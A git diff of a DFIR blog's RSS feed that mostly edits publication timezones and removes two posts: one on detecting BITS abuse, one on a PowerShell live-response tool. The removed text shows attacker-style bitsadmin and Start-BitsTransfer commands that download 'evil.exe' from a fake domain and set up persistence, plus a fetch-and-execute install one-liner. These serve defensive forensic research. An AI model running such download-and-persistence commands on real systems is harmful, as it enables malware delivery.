         <guid isPermaLink="true">https://mgreen27.github.io/posts/2020/07/23/IPSEC.html</guid>
         
@@ -275,7 +767,7 @@ This enables custom IPSec filters to be added to the permit or block rule config
 
 &lt;p&gt;&lt;br /&gt;&lt;br /&gt;&lt;/p&gt;
 </description>
-        <pubDate>Sun, 08 Dec 2019 00:00:00 +1100</pubDate>
+        <pubDate>Sun, 08 Dec 2019 00:00:00 +0000</pubDate>
         <link>https://mgreen27.github.io//posts/2019/12/08/LocalLRwithVRaptor.html</link>
         <guid isPermaLink="true">https://mgreen27.github.io/posts/2019/12/08/LocalLRwithVRaptor.html</guid>
         
@@ -428,7 +920,7 @@ For example  &lt;br /&gt;
 &lt;p&gt;&lt;br /&gt;&lt;br /&gt;&lt;/p&gt;
 
 </description>
-        <pubDate>Sun, 10 Nov 2019 00:00:00 +1100</pubDate>
+        <pubDate>Sun, 10 Nov 2019 00:00:00 +0000</pubDate>
         <link>https://mgreen27.github.io//posts/2019/11/10/LRwithVRaptor.html</link>
         <guid isPermaLink="true">https://mgreen27.github.io/posts/2019/11/10/LRwithVRaptor.html</guid>
         
@@ -576,7 +1068,7 @@ For example  &lt;br /&gt;
 &lt;/ol&gt;
 
 </description>
-        <pubDate>Sun, 09 Jun 2019 00:00:00 +1000</pubDate>
+        <pubDate>Sun, 09 Jun 2019 00:00:00 +0000</pubDate>
         <link>https://mgreen27.github.io//posts/2019/06/09/O365HiddenRules.html</link>
         <guid isPermaLink="true">https://mgreen27.github.io/posts/2019/06/09/O365HiddenRules.html</guid>
         
@@ -649,7 +1141,7 @@ Then execution via a bat file or commandline as below:&lt;/li&gt;
 6) YARA v3.10.0. &lt;a href=&quot;https://yara.readthedocs.io/en/v3.10.0/modules/pe.html&quot;&gt;PE Module&lt;/a&gt;
 &lt;br /&gt;&lt;br /&gt;&lt;/p&gt;
 </description>
-        <pubDate>Wed, 29 May 2019 00:00:00 +1000</pubDate>
+        <pubDate>Wed, 29 May 2019 00:00:00 +0000</pubDate>
         <link>https://mgreen27.github.io//posts/2019/05/29/BinaryRename2.html</link>
         <guid isPermaLink="true">https://mgreen27.github.io/posts/2019/05/29/BinaryRename2.html</guid>
         
@@ -737,7 +1229,7 @@ Similarly, output to a logfile for data ingestion. It is worthy to note: the POC
 &lt;/ol&gt;
 
 </description>
-        <pubDate>Sun, 12 May 2019 00:00:00 +1000</pubDate>
+        <pubDate>Sun, 12 May 2019 00:00:00 +0000</pubDate>
         <link>https://mgreen27.github.io//posts/2019/05/12/BinaryRename.html</link>
         <guid isPermaLink="true">https://mgreen27.github.io/posts/2019/05/12/BinaryRename.html</guid>
         
@@ -863,7 +1355,7 @@ This command will output the generated live response script, to which we need to
 &lt;br /&gt;&lt;br /&gt;&lt;/p&gt;
 
 </description>
-        <pubDate>Sun, 07 Apr 2019 00:00:00 +1100</pubDate>
+        <pubDate>Sun, 07 Apr 2019 00:00:00 +0000</pubDate>
         <link>https://mgreen27.github.io//posts/2019/04/07/ILRScriptBuilder.html</link>
         <guid isPermaLink="true">https://mgreen27.github.io/posts/2019/04/07/ILRScriptBuilder.html</guid>
         
@@ -1001,387 +1493,13 @@ Microsoft BITS also has some specific forensic artefacts I have previously cover
 &lt;p&gt;8) Green, Matthew. &lt;a href=&quot;https://mgreen27.github.io/posts/2018/02/18/Sharing_my_BITS.html&quot;&gt;Sharing my BITS&lt;/a&gt;&lt;/p&gt;
 
 </description>
-        <pubDate>Mon, 02 Apr 2018 00:00:00 +1000</pubDate>
+        <pubDate>Mon, 02 Apr 2018 00:00:00 +0000</pubDate>
         <link>https://mgreen27.github.io//posts/2018/04/02/DownloadCradle.html</link>
         <guid isPermaLink="true">https://mgreen27.github.io/posts/2018/04/02/DownloadCradle.html</guid>
         
         <category>DFIR</category>
         
         <category>Powershell</category>
-        
-        
-        <category>posts</category>
-        
-      </item>
-    
-      <item>
-        <title>Sharing my BITS</title>
-        <description>&lt;div style=&quot;text-align: center;&quot;&gt;&lt;img src=&quot;/static/img/article_images/2018-02-18-Sharing_My_BITS/00title.png&quot; width=&quot;700&quot; /&gt;&lt;/div&gt;
-
-&lt;h2 id=&quot;sharing-my-bits&quot;&gt;Sharing my BITS&lt;/h2&gt;
-&lt;p&gt;I thought I would share some research on Microsoft BITS after a recent tool released by the French ANSSI to parse BITS job artefacts. This tool has sparked my interest due to previous research on download cradles and an interest in the client side forensics. I’m going to give a brief background, talk about some nuances in collection types and provide some background information when I was thinking about detection.&lt;/p&gt;
-
-&lt;h3 id=&quot;what-is-bits-and-why-do-we-care&quot;&gt;What is BITS and why do we care?&lt;/h3&gt;
-&lt;p&gt;Background Intelligent Transfer Service (BITS) is a Windows component used to transfer files asynchronously between a client and a server. Part of all modern Windows systems from 2000+, the most well known use for BITS is Windows updates and other Windows transfer tasks.&lt;/p&gt;
-
-&lt;p&gt;BITS has many interesting features including firewall whitelisted and proxy capable file transfer. BITS can also be configured on a schedule, with prioritisation or throttled transfer over idle network bandwidth. Additional “evil friendly” features are the ability to execute a command line option post job (persistence use case) and transfer policy. A newer feature is peer caching where subnet peer machines can be used as a cache for file downloads.&lt;/p&gt;
-
-&lt;p&gt;In short that means BITS fits the profile as a candidate for attackers “living off the land”. Managed via a COM based API, Powershell or a built in binary (bitsadmin.exe), BITS can be used easily throughout the attack lifecycle.&lt;/p&gt;
-
-&lt;p&gt;For those interested in digging further, I have included some detailed links on capabilities and configuration in my references below.&lt;/p&gt;
-
-&lt;h3 id=&quot;artefact-creation&quot;&gt;Artefact creation&lt;/h3&gt;
-&lt;p&gt;Most of my testing has been working with BITS 5.5 in Windows 8.1, however the content below was tested on Windows 7 through 10.&lt;/p&gt;
-
-&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-powershell&quot; data-lang=&quot;powershell&quot;&gt;&lt;span class=&quot;c&quot;&gt;# Bits download initiated via Powershell&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
-&lt;/span&gt;&lt;span class=&quot;nf&quot;&gt;PS&lt;/span&gt;&lt;span class=&quot;err&quot;&gt;&amp;gt;&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;Start-BitsTransfer&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;-Source&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;http://www.totallylegitinappnews.com/mimi.jpg&quot;&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;-Destination&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;c:\Windows\vss\mimi.exe&quot;&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
-
-&lt;/span&gt;&lt;span class=&quot;c&quot;&gt;# Peristence via bitsadmin.exe&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
-&lt;/span&gt;&lt;span class=&quot;nf&quot;&gt;CMD&lt;/span&gt;&lt;span class=&quot;err&quot;&gt;&amp;gt;&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;bitsadmin&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;/create&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;backdoor&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
-&lt;/span&gt;&lt;span class=&quot;nf&quot;&gt;CMD&lt;/span&gt;&lt;span class=&quot;err&quot;&gt;&amp;gt;&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;bitsadmin&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;/addfile&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;backdoor&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;http://www.totallylegitinappnews.com/evil.exe&quot;&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;  &lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;c:\windows\VSS\evil.exe&quot;&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
-&lt;/span&gt;&lt;span class=&quot;nf&quot;&gt;CMD&lt;/span&gt;&lt;span class=&quot;err&quot;&gt;&amp;gt;&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;bitsadmin&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;/SetNotifyCmdLine&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;backdoor&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;c:\Windows\VSS\evil.exe&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;NULL&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
-&lt;/span&gt;&lt;span class=&quot;nf&quot;&gt;CMD&lt;/span&gt;&lt;span class=&quot;err&quot;&gt;&amp;gt;&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;bitsadmin&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;/resume&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;backdoor&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;
-
-&lt;p&gt;I have shown some really simple examples above to generate artefacts, however in the wild there are also several attack tools that make building stealthy download cradles trivial. Please see references for more information.&lt;/p&gt;
-
-&lt;h3 id=&quot;collection---network&quot;&gt;Collection - Network&lt;/h3&gt;
-&lt;p&gt;Network is by far the easiest collection point via typical web traffic filtering on user agent string and whitelisted domains. Although I have found everything from Windows, to application, to news traffic, with most BITS traffic is fairly static over time. I have found interesting use cases baselining current activity then spotting deviations from normal focusing on content, http method, destination and URL.&lt;/p&gt;
-
-&lt;div style=&quot;text-align: center;&quot;&gt;&lt;img src=&quot;/static/img/article_images/2018-02-18-Sharing_My_BITS/01pcap.png&quot; width=&quot;500&quot; /&gt;&lt;/div&gt;
-
-&lt;p&gt;Limitations in some environments are the obvious here: encrypted traffic. This method will also miss BITS setup with notification command line and not reaching out of the network.&lt;/p&gt;
-
-&lt;h3 id=&quot;collection---endpoint&quot;&gt;Collection - Endpoint&lt;/h3&gt;
-&lt;p&gt;Endpoint is by far the most detailed collection point, but generally the most difficult to master. I have broken out the endpoint into various sections to provide insights. “Defending off the land”, my goals are to find a lightweight collection capability to pull into a scripted solution without pre installation or change of audit policy. Unfortunately, that means probably the most valuable detection points: event monitoring via EDR, Sysmon and EventID 4688 (Process Creation + CLI) events are out, however some of the artefacts can be collected via EDR tools.&lt;/p&gt;
-
-&lt;h1 id=&quot;bits-job-configuration&quot;&gt;Bits job configuration&lt;/h1&gt;
-&lt;p&gt;BITS can be configured and jobs reviewed using either Powershell command-lets or bitsadmin.exe. Limitations on this type of collection are: unless collected during the transfer, only scheduled jobs are available.&lt;/p&gt;
-
-&lt;div style=&quot;text-align: center;&quot;&gt;&lt;img src=&quot;/static/img/article_images/2018-02-18-Sharing_My_BITS/02powershell.png&quot; width=&quot;600&quot; /&gt;&lt;/div&gt;
-
-&lt;p&gt;In my testing, both methods provide similar granular information on job details, however Bitsadmin does provide additional context. In my example below you can see additional configuration of the notification command line feature, also bypassing Autoruns detection.&lt;/p&gt;
-
-&lt;div style=&quot;text-align: center;&quot;&gt;&lt;img src=&quot;/static/img/article_images/2018-02-18-Sharing_My_BITS/03powershell.png&quot; width=&quot;600&quot; /&gt;&lt;/div&gt;
-
-&lt;h1 id=&quot;qmgr-database&quot;&gt;QMGR database&lt;/h1&gt;
-&lt;p&gt;Queue Manager queues store job specification and state. Typically located at: C:\ProgramData\Microsoft\Network\Downloader. For pre-Windows 10 systems, QMGR is stored in files named qmgr0.dat or qmgr1.dat.&lt;/p&gt;
-
-&lt;p&gt;Limitations are: Microsoft has migrated to ESE database format for Queue Manager in Windows 10 and beyond leaving with a solution that would only work on some current systems.&lt;/p&gt;
-
-&lt;p&gt;These are the files parsed by the ANSSI tool - bits_parser. Initially I toyed with the idea of a light weight binary parser in Powershell, to replicate bits_paser in non carving mode and roll in seperate capability for Windows 10.&lt;/p&gt;
-
-&lt;div style=&quot;text-align: center;&quot;&gt;&lt;img src=&quot;/static/img/article_images/2018-02-18-Sharing_My_BITS/04bitsparser.png&quot; width=&quot;600&quot; /&gt;&lt;/div&gt;
-
-&lt;p&gt;Results worked but led me to the second limitation: visibility is focused on scheduled or recent jobs. Thats is great for the BITS persistence use case but single BITS tasks can rotate out of the Queue Manager quickly and may not be recoverable even with carving. Assuming available data, I also found carving in Powershell was too resource intensive for a light weight collection so the preferred method would be to collect and parse offline if carving is required.&lt;/p&gt;
-
-&lt;p&gt;Windows Event logs
-Focusing on default event logs, the best source for detection of malicious download is the Microsoft-Windows-Bits-Client/Operational log. These logs hold: state, source, user and some file information for each BITS transfer. This event log also appears to be similar across Windows 7 through 10 so fits the profile and a good endpoint collection source.&lt;/p&gt;
-
-&lt;div style=&quot;text-align: center;&quot;&gt;&lt;img src=&quot;/static/img/article_images/2018-02-18-Sharing_My_BITS/05eventlogs.png&quot; width=&quot;400&quot; /&gt;&lt;/div&gt;
-
-&lt;p&gt;Limitations include: sparse data, logs are spread over several EventIDs and potentially a lot of entries in a production environment making it difficult to spot evil hiding in the noise. This log will also not shed light on abuse of BITS for persistence unless there was a network transfer to a suspicious domain as part of the configured job.&lt;/p&gt;
-
-&lt;p&gt;Writing a script to pull all EventID 59 events, highlighting some of the available information from the event: Time (converted to UTC), JobName and Source URL we can see the kind of noise to expect in a few hours activity.&lt;/p&gt;
-
-&lt;p&gt;&lt;img src=&quot;/static/img/article_images/2018-02-18-Sharing_My_BITS/06bitsdetectall.png&quot; alt=&quot;Parsing eventlogs for detection&quot; /&gt;&lt;/p&gt;
-
-&lt;p&gt;Following similar concepts to network based detection, I was able to build a whitelist for common domains from my network logs and whitelist out most of the noise potentially seen day to day.&lt;/p&gt;
-
-&lt;div style=&quot;text-align: center;&quot;&gt;&lt;img src=&quot;/static/img/article_images/2018-02-18-Sharing_My_BITS/07bitsdetect.png&quot; width=&quot;600&quot; /&gt;&lt;/div&gt;
-
-&lt;p&gt;This method may be particularly helpful in environments that may have limitations on network encryption visibility. Some work is required to build out the whitelist with lots of outliers in a large network.&lt;/p&gt;
-
-&lt;p&gt;My content is &lt;a href=&quot;https://github.com/mgreen27/Invoke-BitsParser&quot;&gt;available here&lt;/a&gt;. Some of the other features I have added are:&lt;/p&gt;
-
-&lt;ul&gt;
-  &lt;li&gt;Configuration of days back to search (default 14).&lt;/li&gt;
-  &lt;li&gt;A switch (“-All”) to list all entries available in the logs to collect data to rejig whitelists from an endpoint view.&lt;/li&gt;
-&lt;/ul&gt;
-
-&lt;h3 id=&quot;final-thoughts&quot;&gt;Final Thoughts&lt;/h3&gt;
-&lt;p&gt;I couldn’t finish this post without talking a little about capabilities all organisations should aspire to. Gold standard should be a mix of network and endpoint based visibility, with the ability to cover all gaps from each single source.&lt;/p&gt;
-
-&lt;p&gt;Critical for a modern blue team, some of my recommendations are:&lt;/p&gt;
-
-&lt;ul&gt;
-  &lt;li&gt;Network based visibility around encrypted web traffic with content inspection.&lt;/li&gt;
-  &lt;li&gt;Process command line visibility on the endpoints to spot evil process chains and unusual command lines or obfuscation that is abnormal for the environment.&lt;/li&gt;
-  &lt;li&gt;Process module load visibility to spot unexpected functionality loaded.&lt;/li&gt;
-  &lt;li&gt;Process network activity to unexpected locations is also a good method to increase the scope of detection on the endpoint and provide additional context to network detections that may have visibility limitations.&lt;/li&gt;
-  &lt;li&gt;Spotting disk or registry write events out of normal activity and having context of associated process. Why is svchost.exe writing evil.exe to c:\Windows\VSS?&lt;/li&gt;
-  &lt;li&gt;Ability to execute adlib collections to answer questions of the environment.&lt;/li&gt;
-  &lt;li&gt;Upgrading to Powershell version 5 for Powershell script block visibility.&lt;/li&gt;
-&lt;/ul&gt;
-
-&lt;p&gt;I hope this post has provided some good food for thought and pointed anyone interested in the direction for further research and reference material. Feel free to reach out if you have any questions.&lt;/p&gt;
-
-&lt;h2 id=&quot;references&quot;&gt;References&lt;/h2&gt;
-&lt;ol&gt;
-  &lt;li&gt;
-    &lt;p&gt;ANSSI. &lt;a href=&quot;https://github.com/ANSSI-FR/bits_parser&quot;&gt;Bits_Parser&lt;/a&gt;&lt;/p&gt;
-  &lt;/li&gt;
-  &lt;li&gt;
-    &lt;p&gt;Azouri, Dor. &lt;a href=&quot;https://media.defcon.org/DEF%20CON%2025/DEF%20CON%2025%20presentations/Dor%20Azouri/DEFCON-25-Dor-Azouri-BITSInject-WP.pdf&quot;&gt;BITSInject&lt;/a&gt;&lt;/p&gt;
-  &lt;/li&gt;
-  &lt;li&gt;
-    &lt;p&gt;Bohannon, Daniel. &lt;a href=&quot;https://github.com/danielbohannon/Invoke-CradleCrafter&quot;&gt;Invoke-CradleCrafter&lt;/a&gt;&lt;/p&gt;
-  &lt;/li&gt;
-  &lt;li&gt;
-    &lt;p&gt;Geiger,Matthew. &lt;a href=&quot;https://www.dfrws.org/sites/default/files/session-files/pres-finding_your_naughty_bits.pdf&quot;&gt;Finding Your Naughty BITS&lt;/a&gt;&lt;/p&gt;
-  &lt;/li&gt;
-  &lt;li&gt;
-    &lt;p&gt;Hexacorn. &lt;a href=&quot;http://www.hexacorn.com/blog/2017/07/12/beyond-good-ol-run-key-part-64/&quot;&gt;Beyond Good Old RUn Key part 64&lt;/a&gt;&lt;/p&gt;
-  &lt;/li&gt;
-  &lt;li&gt;
-    &lt;p&gt;Microsoft. &lt;a href=&quot;https://docs.microsoft.com/en-us/previous-versions/windows/it-pro/windows-server-2012-R2-and-2012/cc753856(v=ws.11)&quot;&gt;Bitsadmin documentation&lt;/a&gt;&lt;/p&gt;
-  &lt;/li&gt;
-  &lt;li&gt;
-    &lt;p&gt;Microsoft. &lt;a href=&quot;https://github.com/MicrosoftDocs/windows-powershell-docs/tree/master/docset/windows/bitstransfer&quot;&gt;Powershell Bitstransfer documentation&lt;/a&gt;&lt;/p&gt;
-  &lt;/li&gt;
-  &lt;li&gt;
-    &lt;p&gt;Microsoft. &lt;a href=&quot;https://msdn.microsoft.com/en-us/library/windows/desktop/ee663885(v=vs.85).aspx&quot;&gt;Using Windows Powershell to create BITS Jobs&lt;/a&gt;&lt;/p&gt;
-  &lt;/li&gt;
-  &lt;li&gt;
-    &lt;p&gt;O’Day, Dan. &lt;a href=&quot;https://github.com/danzek/annotationis/blob/master/Operating%20Systems/Windows/BITS.md&quot;&gt;BITS annotationis&lt;/a&gt;&lt;/p&gt;
-  &lt;/li&gt;
-  &lt;li&gt;
-    &lt;p&gt;Secureworks, Counter Threat Unit. &lt;a href=&quot;https://www.secureworks.com/blog/malware-lingers-with-bits&quot;&gt;Malware Lingers with BITS&lt;/a&gt;&lt;/p&gt;
-  &lt;/li&gt;
-&lt;/ol&gt;
-
-</description>
-        <pubDate>Sun, 18 Feb 2018 00:00:00 +1100</pubDate>
-        <link>https://mgreen27.github.io//posts/2018/02/18/Sharing_my_BITS.html</link>
-        <guid isPermaLink="true">https://mgreen27.github.io/posts/2018/02/18/Sharing_my_BITS.html</guid>
-        
-        <category>DFIR</category>
-        
-        <category>BTIS</category>
-        
-        <category>Powershell</category>
-        
-        <category>LiveResponse</category>
-        
-        <category>IR</category>
-        
-        
-        <category>posts</category>
-        
-      </item>
-    
-      <item>
-        <title>Invoke-LiveResponse</title>
-        <description>&lt;p&gt;&lt;img src=&quot;/static/img/article_images/2018-01-14-Invoke-LiveResponse/00PowerShellthumb.png&quot; alt=&quot; &quot; /&gt;&lt;/p&gt;
-
-&lt;h2 id=&quot;invoke-liveresponse&quot;&gt;Invoke-LiveResponse&lt;/h2&gt;
-&lt;p&gt;In this post, I am going to talk about a Powershell module I have authored as a simple 
-implementation for live response and file collections over Powershell remoting. The initial use case was considered after an endpoint vendor appliance failed and capability for raw collections was limited. The module uses Powerforensics over WinRM, and after some interest, I think is worth sharing.&lt;/p&gt;
-
-&lt;p&gt;Some of the areas I will cover are:&lt;/p&gt;
-
-&lt;ul&gt;
-  &lt;li&gt;Background.&lt;/li&gt;
-  &lt;li&gt;Requirements and setup.&lt;/li&gt;
-  &lt;li&gt;Module switches and configuration.&lt;/li&gt;
-  &lt;li&gt;Performance tweaks.&lt;/li&gt;
-  &lt;li&gt;Forensic Footprint over WinRM.&lt;/li&gt;
-&lt;/ul&gt;
-
-&lt;p&gt;The goal of this project was to promote Powershell as a blue team tool and improve my Powershell knowledge with research.&lt;/p&gt;
-
-&lt;p&gt;Github: &lt;a href=&quot;https://github.com/mgreen27/Powershell-IR&quot;&gt;https://github.com/mgreen27/Powershell-IR&lt;/a&gt;&lt;/p&gt;
-
-&lt;h3 id=&quot;background&quot;&gt;Background&lt;/h3&gt;
-&lt;p&gt;The ability to collect live response data from a remote system is a fundamental requirement for modern incident response. Rouge processes, code injection, suspicious network activity or other disk and memory artefacts are some of data points an analyst may look for signs of evil. The ability to collect these data points quickly, enables informed decisions and reduces risk of loss from an incident. Some of the difficulties in accessing these artefacts include lack of endpoint visibility or capabilities for ad-lib collection, from either a technical or business limitation.&lt;/p&gt;
-
-&lt;div style=&quot;text-align: center;&quot;&gt;&lt;img src=&quot;/static/img/article_images/2018-01-14-Invoke-LiveResponse/02powerforensics.png&quot; /&gt;&lt;/div&gt;
-
-&lt;p&gt;PowerForensics is a disk forensic framework for Powershell written in C# by Jared Atkinson. Typical use case is local analysis from a traditional collection enabling the analyst to perform detailed disk forensics similar to the more well known Sleuth Kit. Powerforensics can also be used for similar tasks over Powershell remoting.&lt;/p&gt;
-
-&lt;p&gt;In offensive security, one of the biggest enablers in Powershell is the capability to reflectively load PE files, shellcode and assembly into memory. That means security tools can be loaded from a Powershell script, in some cases never touching disk. The same techniques can be used by the Blue Team and quite a few practitioners are starting to use this feature for things like memory and volatile data forensics. Powerforensics enables the capability for remote raw disk analysis using Assembly.Load Method.&lt;/p&gt;
-
-&lt;p&gt;Invoke-LiveResponse is the result of converting some scripts for raw collection with redirected acquisition and live response into an easy to use tool. During use, I have tweaked some performance and learnt a lot in implementation about both Powershell and Powerforensics.&lt;/p&gt;
-
-&lt;h3 id=&quot;requirements&quot;&gt;Requirements&lt;/h3&gt;
-&lt;ul&gt;
-  &lt;li&gt;Powershell 4.0 or above collector machine (3 should also be functional).&lt;/li&gt;
-  &lt;li&gt;Powershell 2.0 or above target machine/s.&lt;/li&gt;
-  &lt;li&gt;Powerforensics installed in running user Powershell Modules path (I have included automatic installation below).&lt;/li&gt;
-  &lt;li&gt;WinRM setup with Kerberos and/or Negotiation authentication.&lt;/li&gt;
-  &lt;li&gt;SMB Network share with write access (for file collections).&lt;/li&gt;
-&lt;/ul&gt;
-
-&lt;h3 id=&quot;setup&quot;&gt;Setup&lt;/h3&gt;
-&lt;p&gt;On a Powershell 4+ collector machine, assuming you trust me, run the following proxy aware powershell commands to download then install. The install places Invoke-LiveResponse into the running users profile.&lt;/p&gt;
-
-&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-powershell&quot; data-lang=&quot;powershell&quot;&gt;&lt;span class=&quot;c&quot;&gt;# Proxy aware download install of Invoke-LiveResponse&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
-&lt;/span&gt;&lt;span class=&quot;nf&quot;&gt;Set-Executionpolicy&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;-ExecutionPolicy&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;bypass&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;-force&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
-&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$url&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;https://raw.githubusercontent.com/mgreen27/Powershell-IR/master/Get-Forensicating.ps1&quot;&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
-&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$WebClient&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nf&quot;&gt;New-Object&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;System.Net.WebClient&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
-&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$WebClient&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nf&quot;&gt;Proxy&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;no&quot;&gt;System.Net.&lt;/span&gt;&lt;span class=&quot;kt&quot;&gt;WebRequest&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]::&lt;/span&gt;&lt;span class=&quot;nf&quot;&gt;GetSystemWebProxy&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;()&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
-&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$WebClient&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nf&quot;&gt;Proxy&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nf&quot;&gt;Credentials&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;no&quot;&gt;System.Net.&lt;/span&gt;&lt;span class=&quot;kt&quot;&gt;CredentialCache&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]::&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;DefaultNetworkCredentials&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
-&lt;/span&gt;&lt;span class=&quot;nf&quot;&gt;Invoke-Expression&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$WebClient&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nf&quot;&gt;DownloadString&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$url&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
-
-&lt;/span&gt;&lt;span class=&quot;c&quot;&gt;# Once installed run to load&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
-&lt;/span&gt;&lt;span class=&quot;nf&quot;&gt;Import-Module&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;Invoke-LiveResponse&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
-
-&lt;/span&gt;&lt;span class=&quot;c&quot;&gt;# View help&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
-&lt;/span&gt;&lt;span class=&quot;nf&quot;&gt;Get-Help&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;Invoke-LiveResponse&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;-detailed&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;
-
-&lt;h3 id=&quot;winrm&quot;&gt;WinRM&lt;/h3&gt;
-&lt;p&gt;I recommend setting WinRM up via Group policy for simplified deployment across all Powershell versions. Please see the resource section for some good resources and a detailed walkthrough, including a previous post of mine in setting up a lab.&lt;/p&gt;
-
-&lt;p&gt;For a quick and dirty install, Invoke-StartWinRM will turn on PSRemoting and configure appropriate credential configurations on Powershell 3 machines and above. Similarly, Invoke-StopWinRM may also be used to revert changes.&lt;/p&gt;
-
-&lt;div style=&quot;text-align: center;&quot;&gt;&lt;img src=&quot;/static/img/article_images/2018-01-14-Invoke-LiveResponse/03invoke-startwinrm.png&quot; width=&quot;600&quot; /&gt;&lt;/div&gt;
-
-&lt;h3 id=&quot;credential-risk&quot;&gt;Credential Risk&lt;/h3&gt;
